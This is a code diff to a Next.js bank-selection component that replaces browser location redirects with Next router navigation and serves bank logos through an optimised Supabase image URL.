@@ -1,7 +1,9 @@
 "use client";
 
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
+import { useRouter } from "next/navigation";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
+import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
 import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { useSettings } from "@/contexts/SettingsContext";
@@ -13,6 +15,7 @@ type Props = {
 };
 
 export function BankenClientClean({ sessionId, initialBanks }: Props) {
+  const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
   const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
@@ -149,7 +152,7 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
       const cachedSessionId = localStorage.getItem("activeSessionId");
       if (cachedSessionId) {
         setRecovering(true);
-        window.location.href = "/banken";
+        router.replace("/banken");
       }
     } catch {
       /* ignore localStorage access errors */
@@ -205,7 +208,7 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
     }
     else {
       setSessionFormData(nextFormData);
-      window.location.assign(`/win/${sessionId}/bank/${nextBankSlug}`);
+      router.push(`/win/${sessionId}/bank/${nextBankSlug}`);
     }
   }
 
@@ -298,7 +301,7 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
                 >
                   <div className="flex flex-1 items-center justify-center mt-0.5">
                     <img
-                      src={opt.logoFile}
+                      src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 80, width: 128 }) || opt.logoFile}
                       alt={opt.displayName}
                       className="h-8 w-8 sm:h-6 sm:w-6 lg:h-8 lg:w-8 object-contain rounded"
                       onError={(e) => {
